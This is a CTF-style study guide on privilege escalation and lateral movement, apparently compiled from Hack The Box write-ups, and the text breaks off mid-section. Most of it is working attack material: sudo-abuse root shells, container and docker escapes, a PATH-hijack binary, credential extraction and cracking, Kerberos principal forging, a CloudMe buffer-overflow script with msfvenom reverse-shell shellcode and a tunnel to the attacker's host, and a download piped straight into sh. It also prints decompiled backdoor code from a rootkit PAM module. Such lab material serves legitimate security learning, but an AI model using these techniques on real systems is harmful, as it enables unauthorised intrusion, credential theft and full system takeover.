# 3. Lateral Movement & Privilege Escalation

- [3. Lateral Movement & Privilege Escalation](#3-lateral-movement--privilege-escalation)
  * [Linux & windows](#linux--windows)
    + [Users and Groups](#users-and-groups)
      - [Machine SneakyMailer(10.10.10.197)](#machine-sneakymailer101010197)
      - [Machine Tabby(10.10.10.188)](#machine-tabby101010188)
      - [Machine Academy(10.10.10.215)](#machine-academy101010215)
    + [SUID and SGID](#suid-and-sgid)
      - [Machine Laboratory(10.10.10.216)](#machine-laboratory101010216)
    + [Credential Access & Crack](#credential-access--crack)
      - [Machine Blunder(10.10.10.191)](#machine-blunder101010191)
      - [Machine Compromised(10.10.10.207)](#machine-compromised101010207)
      - [Machine Jewel(10.10.10.211)](#machine-jewel101010211)
      - [Machine Luanne(10.10.10.218)](#machine-luanne101010218)
      - [Machine Breadcrumbs(10.10.10.228)](#machine-breadcrumbs101010228)
    + [Processes](#processes)
      - [Machine Dyplesher(10.10.10.190)](#machine-dyplesher101010190)
    + [Network](#network)
      - [Machine Cache(10.10.10.188)](#machine-cache101010188)
    + [Services](#services)
      - [Machine Buff(10.10.10.198)](#machine-buff101010198)
      - [Machine Bucket(10.10.10.212)](#machine-bucket101010212)
      - [Machine Tentacle(10.10.10.224)](#machine-tentacle101010224)
    + [Scheduled/Cron jobs](#scheduledcron-jobs)
      - [Machine Tentacle(10.10.10.224)](#machine-tentacle101010224-1)
    + [Docker Breakout](#docker-breakout)
      - [Machine Cache(10.10.10.188)](#machine-cache101010188)
      - [Machine Ready(10.10.10.220)](#machine-ready101010220)
    + [Library hijack](#library-hijack)
      - [Machine Admirer(10.10.10.187)](#machine-admirer101010187)
  * [Active Directory](#active-directory)
      - [Machine Multimaster(10.10.10.179)](#machine-multimaster101010179)
      - [Machine Blackfield(10.10.10.192)](#machine-blackfield101010192)
      - [Machine Fuse(10.10.10.193)](#machine-fuse101010193)
      - [Machine APT(10.10.10.213)](#machine-apt101010213)

First thing to do is collecting system information with [PEASS](https://github.com/carlospolop/PEASS-ng).

## Linux & windows

Collect System Information: [LinPEAS - Linux Privilege Escalation Awesome Script](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesomescripts-suite/master/linPEAS) and  [WinPEAS - Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

The first thing to check is common privilege escalation vectors. We can automate this using LinPEAS.  

```shell
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesomescripts-suite/master/linPEAS/linpeas.sh
python3 -m http.server 80
```

Download the script to the server and run it. 

```shell
cd /dev/shm
curl 10.10.x.x/linpeas.sh | sh
```

### Users and Groups

#### Machine SneakyMailer(10.10.10.197)

Now have a `low` ssh shell.

Enumerating the user privileges, it's found that `low` has been assigned sudo privileges to run `pip3` as root.  

We can follow the [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo) reference to obtain a root shell.  

```shell
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

#### Machine Tabby(10.10.10.188)

Enumeration of the user reveals membership of the `lxd` group.

The lxd (Linux Daemon) is a system container manager, that controls lxc (Linux Container). Linux Container (LXC) is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user ash to create a privileged container and then use it to mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it to the remote machine.   

```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
./build-alpine  
```

A compressed file alpine-v3.12-x86_64-20201106_1855.tar.gz is created.  Download it to the machine.

On the remote machine, run the following to initiate lxd , inputting no to all prompts .

```
lxd init
```

Next, we run the following command to import the alpine image.  

```
lxc image import ./alpine-v3.12-x86_64-20201106_2000.tar.gz --alias alpine
```

To check if the image is successfully imported.

```
lxc image list
```

Next, we need to make the container privileged, and mount the filesystem, before starting the container.  

```
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
recursive=true
lxc start mycontainer

lxc exec mycontainer /bin/sh
```

Now have a root shell.

#### Machine Academy(10.10.10.215)

Now have a shell as cry0l1t3.

The id command reveals that this user is a member of adm group. The adm group allows users to read  system logs. In Linux all logs are located inside the /var/log folder.

```shell
./LinPEAS.sh

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 3512 Nov  9 13:00 /var/log/apt/term.log
-r--r----- 1 root adm 8388720 Sep  4 03:45 /var/log/audit/audit.log.2
-rw-r----- 1 root adm 658963 Nov 10 09:10 /var/log/audit/audit.log
-r--r----- 1 root adm 8388617 Aug 23 21:45 /var/log/audit/audit.log.3
-r--r----- 1 root adm 8388702 Nov  9 12:34 /var/log/audit/audit.log.1
-rw-r----- 1 root adm 2917 Nov 10 08:43 /var/log/apache2/access.log
-rw-r----- 1 root adm 0 Aug  7 14:30 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 304254 Nov  5 12:56 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 289 Nov 10 08:43 /var/log/apache2/error.log
-rw-r----- 1 root adm 529 Nov 10 00:00 /var/log/apache2/error.log.1
```

The Linux kernel logs a lot of things but by default it doesn't log TTY input. The audit log allows sysadmins to log this. If logging of TTY input is enabled, any input including passwords are stored hex-encoded inside /var/log/audit/audit.log . We can decode these values manually or use the aureport utility to query and retrieve records of TTY input. To learn more about PAM TTY see this [page](https://linux.die.net/man/8/pam_tty_audit). Let's query all TTY logs.

```shell
aureport --tty

TTY Report
<snip>
Note - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 sh "mrb3n_Ac@d3my! ",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash",<nl>
<snip>
```

The TTY report reveals that the mrb3n user logged in with the password using su . Let's do the same.  

Running `sudo -l` with correct password reveals that mrb3n has a sudo entry allowing them to run `/usr/bin/composer` as root.  

There is an entry on [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) for composer. It involves creating a composer.json file with a "scripts" property. Composer allow users to execute system command using script options. We can learn more about it [here](https://getcomposer.org/doc/articles/scripts.md).  

```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

After inputting these commands, we successfully obtain a shell as root.

### SUID and SGID

#### Machine Laboratory(10.10.10.216)

By performing basic enumeration steps by using a script like Linpeas is possible to spot an suid bit set file /usr/local/bin/docker-security . We download the file for further analysis locally. We use ltrace to spot that it executes chmod using a relative path.  

```shell
ltrace  ./docker-security

setuid(0) = 0
setgid(0) = 0
system("chmod 700 /usr/bin/docker" ...
...
```

We can add in our path a custom chmod file that is going to be executed as root. Let's create our chmod file by compiling the following C program that it's going to give us a root shell.  

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

We compile our program locally and then upload it to system at /tmp. Then from our initial shell we add to our path the directory of our compiled program and we execute.  Have a root shell now.  

```shell
export PATH=/tmp/:$PATH
/usr/local/bin/docker-security
# id 
uid=0(root) gid=0(root) ...
```

### Credential Access & Crack

#### Machine Blunder(10.10.10.191)

Now have a www-data shell.

Enumeration of the system reveals two home directories belonging to the users `hugo` and `shaun` . It's also worth checking the /var/www folder for interesting files, as it might contain database credentials or other web passwords.  

The folder contains a newer version of the Bludit CMS that has not yet replaced the older version.Researching the directory structure for Bludit reveals that credentials are stored in the file /bl-content/databases/users.php .  

Inspection of this file reveals a SHA-1 hashed password for Hugo, which can be decrypted using various online tools such as [md5decrypt](https://md5decrypt.net/en/Sha1/). After decrypting the hash, the password is revealed to be Password120 .  

Password reuse is very common, and possibly Hugo has set the same password on their system account. Let's spawn a PTY shell, as this will allow us to use the `su` command.  

```shell
python -c "import pty;pty.spawn('/bin/bash');"
su hugo
```

Now have a hugo shell.  

`LinPEAS` reveals that the sudo version is 1.8.25p1 . Researching this specific sudo version, a vulnerability assigned CVE-2019-14287 is identified.  Run `sudo -l  `, The output reveals that user Hugo can run /bin/bash as every user except root .  

It is trivial to [bypass](https://www.exploit-db.com/exploits/47502) this exclusion and run bash as root. The command to achieve this is as follows.

```
sudo -u#-1 /bin/bash
# Now root
```

#### Machine Compromised(10.10.10.207)

This machine is interesting. Suppose that the server was compromised, how to find traces of the intrusion?

Now have a shell as mysql.

```shell
# from LinPEAS.sh
# grep -R -e 'password' /var/log/
mysql@compromised:~$ grep -RiIE "password.*[=:].+" /home /var/ /tmp /etc /root /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq

/var/lib/mysql/strace-log.dat:22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
/var/lib/mysql/strace-log.dat:22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
```

Another way.

Enumeration of the home directory`/var/lib/mysql/` reveals an interesting file called strace-log.dat .  

This is not part of the default MySQL installation. The `--time-style` flag for the ls command can be used to list the last edit times of the files in the directory. The last edit times are interesting to us as they could reveal what an attacker did.  

```shell
ls -al --time-style=full-iso
<snip>
-r--r----- 1 root mysql	 787180 2020-05-13 02:10:28.000000000 +0000 strace-log.dat
```

The output reveals that the full time of strace-log.dat is populated by zeroes in the right-most part, contrary to the rest of the files.  

The right-most part in the last modified time property, includes everything from micro seconds to yocto seconds. **When files are created from package managers such as apt , or when we timestomp a file manually but don't include the seconds value, those files will have zeros in the right-most part**. **User generated files however or files directly edited by a service will have those values filled out with numbers**.The file strace-log.dat seems like it has been edited after it's creation to set its date to be close in range to the surrounding files, which would make it appear normal. The contents of the file contain output from the strace command, which is used to show system calls from executables. 

Researching online for strace and methods to create persistent backdoors using it, lead to [this](https://www.securitynik.com/2014/04/the-poor-mans-keylogger-strace.html) blog post, which details the usage of the strace command to act as a key logger.  

In the example provided, strace is configured to capture system calls from a bash process that is running from the root account. The captured calls are outputted to a log file, and anything that is written to the bash shell from the root user is captured and stored. This may include usernames, passwords and other sensitive information. Possibly this log file was created by the  attacker, and they might have captured such information.  

```shell
grep password strace-log.dat
# 22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE......"], 0x55bc62467900 /* 21 vars */) = 0
```

Now we can `su sysadmin  ` with the pass.

Standard enumeration of the system does not reveal any useful information that could be leveraged to increase our privileges. However, the attacker could have created a way for them to log back into the system in case they lose access.  

Two **rootkits** are installed. The first is a shared library called libdate.so , which has been set to execute during read system calls using **LD_PRELOAD**. The second is a malicious **pam_unix.so** , which was used to replace the original file of the same name, and is called every time an authentication request is made. Both of these files contain hardcoded master keys that once inputted, allow users to escalate to the root account.  How to find rootkits ?

A common way of maintaining persistence on an exploited system is through the use of the /etc/ld.so.preload file. This file can be used to specify a list of additional, user-specified, shared libraries to be loaded before all others on the system. Under normal circumstances this file should not exist on the system.  

In this case however, it does exist and contains a single line that is used to load a library called `libdate.so` . This library does not sound familiar and seems user-generated. The ldd command can be used to check the libraries a binary will attempt to load upon execution.  

```shell
ldd /bin/bash
	linux-vdso.so.1
	/lib/x86_64-linux-gnu/libdate.so
ldd /bin/sh
	linux-vdso.so.1
	/lib/x86_64-linux-gnu/libdate.so
ldd /usr/bin/find
	linux-vdso.so.1
	/lib/x86_64-linux-gnu/libdate.so
```

Various tests using ldd confirm that all of the binaries load this library upon execution.  

Reverse libdate.so, find hardcoded password `2wkeOU4sjv84ok/ `. Now we can su root.

One of the most common locations for the installation of backdoors or rootkits is the /lib directory, as it contains a plethora of files and folders and anything added maliciously can easily be hidden from a user that is trying to clean their system.  

We already noted that file modification timestamps are a useful indicator that can be used to find files like these, and native Linux commands such as find and grep will come in handy. The following commands search the /lib directory for files while printing the full modification time as well as the path to each file found. The grep utility is then used to exclude any results that contain zeroes in the modification time as those are usually benign.  

```shell
find /lib -type f -printf "%T+ %p\n" | grep -v 0000000000
# 2020-08-31+03:25:57.6079903490 /lib/x86_64-linux-gnu/security/pam_unix.so
```

Use ida to reverse pam_unix.so.

```c
<snip>
	v11 = dcgettext("Linux-PAM", "Password: ", 5);
    v9 = unix_read_password(pamh, v4, 0LL, v11, 0LL, "-UN*X-PASS", &p);
    if ( v9 )
    {
      if ( v9 == 30 )
        v9 = 31;
      else
        pam_syslog(pamh, 2LL, "auth could not identify password for [%s]", name, v12);
    }
    else
    {
      v13 = (const char *)p;
      strcpy(backdoor, "zlke~U3Env82m2-");
      v9 = strcmp((const char *)p, backdoor);
      if ( v9 )
        v9 = unix_verify_password(pamh, name, v13, v4);
      p = 0LL;
    }
<snip>    
```

To escalate to the root user, `su -` can be used at it uses the PAM module for authentication .

#### Machine Jewel(10.10.10.211)

Now have a shell as bill.

Enumeration of the filesystem reveals the file /var/backups/dump_2020-08-27.sql , which contains the password for the users bill and jennifer .  

Using John The Ripper to crack the hashes with the rockyou.txt wordlist is successful, and we get the password.  

```shell
echo '$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW' > hashes
echo '$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO' >> hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

After upgrading to a interactive pty session trying the password with `sudo -l` we're prompted to enter a verification code. 

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l

# [sudo] password for bill:
# Verification code:
```

Checking the home directory of our user, we see a .google_authenticator file that contains settings for the Google Authenticator PAM module.

```shell
cat .google_authenticator

2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH
```

We can use this secret to generate a OTP on our VM.

```shell
apt install oathtool
oathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4'  

481754
```

Trying `sudo -l` again and inputting the code from oauthtool , we see that we can run `/usr/bin/gem` as root. The [GTFOBins](https://gtfobins.github.io/gtfobins/gem/#sudo) repo provides an example of how this binary can be abused in order to get a root shell.

```shell
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id # uid=0(root) gid=0(root) groups=0(root)
```

#### Machine Luanne(10.10.10.218)

Now have a shell as _httpd.

Enumeration of the filesystem reveals the file `/var/www/.htpasswd` .  

```shell
cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0

echo "webapi_user:\$1\$vVoNCsOl\$lMtBS6GL2upDbR4Owhzyc0" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

We can verify that these are the credentials for the authentication that is required to access the web page on port 80.  Looking back on how the httpd server is running, we notice that the flag -u is enabled. According to the `bozohttpd` manual we found earlier online, we see that this option makes the directory
/home/r.michaels/public_html (if one exists), available in the [URL](http://localhost:3001/r.michaels).  Also, since the -X option is enabled, directory listing will be possible, but only if there isn't any index.html file present.  

```
-u	Enables the transformation if Uniform Resource Locators of the form /~user/ into the directory ~user/public_html (but see the -p option above).

-x	Enables directory indexing. A directory index will be generated only when the default file (i.e. index.html normally) is not present.
```



```shell
ps auxww

USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
r.michaels  185  0.0  0.0  34992  1988 ?     Is    7:29AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
_httpd      376  0.0  0.0  34952  2000 ?     Ss    7:29AM 0:00.25 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
```

Let's try to access this directory, by issuing the following cURL command.  

```
curl --user webapi_user:thepass localhost:3001/~r.michaels/

<snip>
<tr><td><a href="../">Parent Directory</a>...</tr>
<tr><td><a href="id_rsa">id_rsa</a>...</tr>
<snip>
```

This worked and the directory seems to contain the private key id_rsa . Let's copy this key locally and try to connect to the host as user r.michaels over SSH. First, issue the following cURL command to read the content of the file.  

```shell
curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
chmod 600 id_rsa
ssh -i id_rsa r.michaels@10.10.10.218
# now have a shell as r.michaels.
```

#### Machine Breadcrumbs(10.10.10.228)

We capture a single base64 encoded string `H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=`  of Administrator. We already know that the encryption algorithm is AES. 

We can now try to decrypt it using pyaes.  

```python
import pyaes
from base64 import b64decode

key = b"k19D193j.<19391("
aes = pyaes.AESModeOfOperationCBC(key)
enc = b64decode("H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=")
dec = b''

for i in range(0, len(enc), 16):
    dec += aes.decrypt(enc[i:i+16])
print(dec)
```

**Alternate method**

```python
import base64
from Crypto.Cipher import AES

cipher = base64.b64decode("H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=")
iv = bytes(16)
aes = AES.new(b'k19D193j.<19391(', AES.MODE_CBC, iv)
plain = aes.decrypt(cipher)
print(plain.decode('utf-8'))
```

### Processes

#### Machine Dyplesher(10.10.10.190)

We can now login using SSH as MinatoTW .  

It's seen that MinatoTW is part of wireshark group. Use a process monitoring tool such as pspy to check for crons and active processes.Transfer pspy to the server using SCP.  

```shell
scp pspy32s MinatoTW@10.10.10.190:/home/MinatoTW
```

After running pspy a while, from the output it can be seen that root is starting a service called amqp-com every minute.  

The rabbitmq service is also being run at regular intervals. RabbitMQ is a general purpose message broker that supports several protocols such as AMQP, MQTT and more. AMQP stands for Advanced Message Queuing Protocol. Message queuing is a style of service-to-service communication. It allows applications to communicate by sending messages to each other. 
RabbitMQ delivers messages to multiple consumers. A consumer is a user application that receives messages by subscribing to a particular topic on the message broker. 

Checking files owned by the wireshark group, we can see a single file `/usr/bin/dumpcap`.  

The dumpcap utility can be used to capture live network traffic. With the obtained information, we can imagine that there might be some communication taking place between the RabbitMQ broker and the host, using AMQP protocol (over TCP). Wireshark's command-line utility tshark is also present on the server.
We can start capturing the packets using either tshark or dumpcap on port 5672 .  

```
tshark -i any -w /tmp/capture.pcap "port 5672"
```

After a little while, we can stop the process and transfer the capture file to our machine for further analysis.  The capture file can be opened in Wireshark .

```
scp MinatoTW@10.10.10.190:/tmp/capture.pcap .
```

he TCP stream reveals information on subscribers which includes emails and passwords.  From this, we can su another user.



### Network

#### Machine Cache(10.10.10.188)

Enumeration of the internal network reveals a service running on port 11211 . Searching online,
it seems that Memcached is commonly associated with this port.  

We can execute commands against the memcached service using Netcat. Commands for memcached can be found here. The command `stats items` displays the number that identifies a specific item.  

```
nc 127.0.0.1 11211
stats items
```

To dump keys that are cached, we can use the command cachedump , with the following structure: `stats cachedump <slab class> <number of items to dump>` .   

```shell
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
get user 	  	# luffy
get passwd  	#  0n3_p1ec3
get account 	#  afhj556uo
```

Now `su luffy` with the pass, we have luffy shell.

### Services

#### Machine Buff(10.10.10.198)

Now have a `shun ` stable reverse shell .

Check for **restricted services** from the outside.

```
C:\xampp\htdocs\gym\upload> netstat -an | findstr "TCP"

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
```

On enumerating the file system, we come across the binary `CloudMe_1112.exe` in the directory `C:\Users\shaun\Downloads` .  

After downloading and running the installer in a VM, we see that the service is listening on port 8888. 

Searching online for "Cloud Me" version 1112 returns this [Exploit-DB](https://www.exploit-db.com/exploits/48389) exploit. Inspection reveals that it's a buffer overflow exploit (see Appendix A for the code listing). As the service listens on localhost, we can make this port available to our machine using a SOCKS proxy. To accomplish this, we can use [Chisel](https://github.com/jpillora/chisel). First, set up the Chisel server on our attacking machine, listening on port 9999.  

```
./chisel server -p 9999 --reverse
```

We can download Chisel for Windows and upload it to the target machine so we can tunnel port 8080 to our system.  

```
chisel.exe client 10.10.x.x:9999 R:8888:127.0.0.1:8888  
```

Or use plink.

```
# after upload plink to the machine and config your ssh server
plink.exe -l youruser -pw yourpass 10.10.x.x -R 8888:127.0.0.1:8888
```

use msfvenom to generate shellcode.  

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```

Next, stand up a Netcat listener on port 4444, replace shellcode in the script and then run it. The script will send our payload to the service at 8888.  

```python
# exp.py
import socket
import sys

target = "127.0.0.1"
padding1 = b"\x90" * 1052
EIP = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS = b"\x90" * 30

#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
payload = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24......\x66\x9f"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf = padding1 + EIP + NOPS + payload + overrun

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(buf)
except Exception as e:
    print(sys.exc_value)
```

After `python exp.py`, we receive a shell as administrator .

#### Machine Bucket(10.10.10.212)

Now have a nc shell as www-data. It's worth upgrading to a TTY shell, which is more functional and allows us to switch to a different user if needed. Issue the below commands to obtain though a stable and interactive shell .

```shell
which python3
stty raw -echo
python3 -c 'import pty;pty.spawn("/bin/bash")';
CTRL+z
fg
export TERM=xterm
```

We can cat `/home/roy/project/db.php`.

```
cat /home/roy/project/db.php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

It seems that the project is still under development. The code is trying to connect to the DynamoDB service using an endpoint url. DynamoDB is a NoSQL database service that supports key-value and document data structures.  Configure:

```shell
mkdir /tmp/f
export HOME=/tmp/f
aws configure

AWS Access Key ID [None]: random
AWS Secret Access Key [None]: random
Default region name [None]: us-east-1
Default output format [None]: json
```

It is now possible to list all tables from DynamoDB.  

```
aws --endpoint-url=http://localhost:4566 dynamodb list-tables

{
    "TableNames": [
        "users"
    ]
}
```

```
aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name users
{
..... # inclues username:roy and password:...
}
```

We spot three credentials present. We try to reuse those credentials in order to switch to user `roy`  with the pass .

#### Machine Tentacle(10.10.10.224)

Now have a shell as root on `smtp.realcorp.htb`. 

By enumerating home folders we spot a .msmtprc file. `msmtp` is an SMTP client which can be used to send emails from mail user agents. It requires a configuration file `~/.msmtprc` with all required information in order to function. By checking the contents of this file reveals a plaintext password.  

We try to connect to SSH service using the credentials: `j.nakazawa / thepass` with no success. As there's Kerberos service(port 88) running on the server, these credentials can be used to **generate a Kerberos ticket which can then be used to authenticate to the SSH service**. We configure the file `/etc/krb5.conf` as below in our machine.  

```
[libdefaults]
	default_realm = REALCORP.HTB
[realms]
	REALCORP.HTB = {
		kdc = srv01.realcorp.htb:88
	}
[domain_realm]
	.realcorp.htb = REALCORP.HTB
	realcorp.htb = REALCORP.HTB
```

We add an additional entry to our hosts file. To make sure our local time is synchronized with the time of the KDC, we run ntpdate .  

```shell
echo '10.10.10.224 srv01.realcorp.htb' >> /etc/hosts
ntpdate 10.10.10.224
```

Run `kinit j.nakazawa` to get a global ticket for j.nakazawa user and running `klist` command shows that the ticket is successfully created.  Run `ssh j.nakazawa@srv01.realcorp.htb` with the Kerberos ticket, we have a shell now.



### Scheduled/Cron jobs

#### Machine Tentacle(10.10.10.224)

Now we have a shell as j.nakazawa.

Enumerating the host we observe an entry in crontab.

```
cat /etc/crontab

* * * * * admin /usr/local/bin/log_backup.sh
```

Review the contents of the log_backup.sh script .

```shell
#!/bin/bash
/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

This script copies all files from `/var/log/squid` to `/home/admin` folder and creates an archive from log files. It then removes log files from the /home/admin folder. User j.nakazawa is part of squid group and can write to this folder. This gives us the ability to write arbitrary files to `/home/admin` folder.
According to the [MIT Kerberos documentation](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html), `.k5login` files can be used to grant other users (identified by Kerberos principals) access to an account without the need of a password. Having already obtained a Kerberos ticket for the `j.nakazawa@REALCORP.HTB` principal, we can exploit the arbitrary file write vulnerability to write a `.k5login` file to `/home/admin` and obtain access as the admin user. Issue the below command to write `.k5login` file to `/var/log/squid` folder.

```shell
echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
```

After a minute we can login to SSH as admin user.

By further enumerating the system, we find that the `/etc/krb5.keytab` file is owned (and readable) by the admin group.  We can list the principals in the keytab file.

```
[admin@srv01 ~] ls -al /etc/krb5.keytab
-rw-r-----. 1 roor admin 1403 DEc 19 06:10 /etc/krb5.keytab

[admin@srv01 ~] klist -kt /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp				Principal
   2 12/08/2020	22:15:30	host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020	22:15:30	host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020	22:15:30	host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020	22:15:30	host/srv01.realcorp.htb@REALCORP.HTB
   2 12/08/2020	22:15:30	host/srv01.realcorp.htb@REALCORP.HTB
   2 12/19/2020	06:00:42	kadmin/changepw@REALCORP.HTB
   2 12/19/2020	06:00:42	kadmin/changepw@REALCORP.HTB
   2 12/19/2020	06:00:42	kadmin/changepw@REALCORP.HTB
   2 12/19/2020	06:00:42	kadmin/changepw@REALCORP.HTB
   2 12/19/2020	06:00:42	kadmin/changepw@REALCORP.HTB
   2 12/19/2020	06:00:53	kadmin/admin@REALCORP.HTB
   2 12/19/2020	06:00:53	kadmin/admin@REALCORP.HTB
   2 12/19/2020	06:00:53	kadmin/admin@REALCORP.HTB
   2 12/19/2020	06:00:53	kadmin/admin@REALCORP.HTB
   2 12/19/2020	06:00:53	kadmin/admin@REALCORP.HTB
```

The `kadmin/admin@REALCORP.HTB` principal is included in the keytab. This allows us to run kadmin with admin privileges and create the `root@REALCORP.HTB` principal.  

```shell
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "add_principal -pw test root@REALCORP.HTB"
```

We switch to root user using `ksu` utility. We provide test when prompted for the password.  This gives us root shell.  

### Docker Breakout

#### Machine Cache(10.10.10.188)

Enumeration of the user luffy reveals that they are a member of the docker group.  

When a user is a member of the docker group, then it is possible to run commands as user root without knowing the root password, as docker runs with the SUID bit. In order to exploit this, a docker image should exist. Issue the following command to list the available docker images on the system.  

```
docker container ps
# image:ubuntu
```

he ubuntu docker image is available. Let's create a new container from this image, and mount the root directory of the host inside the docker container.  

```shell
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# now we have a root shell
```

We used chroot on the /mnt directory, which allows us to execute commands on the host. Use `passwd ` to change the password for the root user.  After exiting the container, we can switch to root.  

#### Machine Ready(10.10.10.220)

By running the following command it is possible to can check whether we reside inside a docker container or not. If we are, run `cat /proc/1/cgroup  ` then some of the control groups will belong to docker . 

Furthermore by having a review at the file /opt/backup/docker-compose.yml , we can observe that the container is running with the flag privileged: true .  

```
cat /opt/backup/docker-compose.yml

<snip>
	privileged： true
	restart: unless-stopped
<snip>
```

When a docker container is running in privileged mode and root access is acquired, escaping the container is then possible. We try to mount the / directory of the host, inside the docker container. But first, we need to execute`lsblk`, in order to get the name of the partition that we are going to mount.  

Let's try to mount the partition sda2 into the directory /mnt .

```
mount /dev/sda2 /mnt -o loop6
ls -l /mnt  
```

The `/` directory is mounted successfully. We create SSH keys for the host user root .  

```
ssh-keygen -f /mnt/root/.ssh/id_rsa -P ""
cp /mnt/root/.ssh/id_rsa.pub /mnt/root/.ssh/authorized_keys
```

Store the key in a file locally and name it id_rsa and give the appropriate permissions. Finally we execute the following command to connect.   

```shell
chmod 400 id_rsa
ssh -i id_rsa root@10.10.10.220
```

### Library hijack

#### Machine Admirer(10.10.10.187)

The first thing to check is common privilege escalation vectors. We can automate this using LinPEAS after ssh in.

Run `sudo -l`,it showes the user may run the command: `(ALL) SETENV: /opt/scripts/admin_tasks.sh`,which means we can run the script admin_tasks.sh as root. Furthermore, the SETENV option is specified, which allows us to change or add an environment variable.  

```shell
# admin_tasks.sh
......
backup_web()
{
	if [ "$EUID" -eq 0 ]
	then
